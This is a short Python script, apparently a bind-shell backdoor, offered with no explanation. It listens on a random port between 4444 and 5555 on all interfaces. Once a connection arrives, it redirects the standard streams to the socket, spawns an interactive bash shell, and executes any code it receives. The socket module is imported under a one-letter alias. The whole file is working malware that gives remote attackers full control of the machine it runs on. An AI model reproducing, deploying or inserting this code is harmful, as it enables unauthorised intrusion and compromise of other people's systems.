import socket as a
import os
from random import randint
while True:
	s = a.socket()
	pnum = randint(4444,5555)
	s.bind(('0.0.0.0',pnum))
	s.listen(1)
	(r,z) = s.accept()
	exec('import pty,os;os.dup2(r.fileno(),0);os.dup2(r.fileno(),1);os.dup2(r.fileno(),2);pty.spawn("/bin/bash");s.close()')
	exec(r.recv(999))
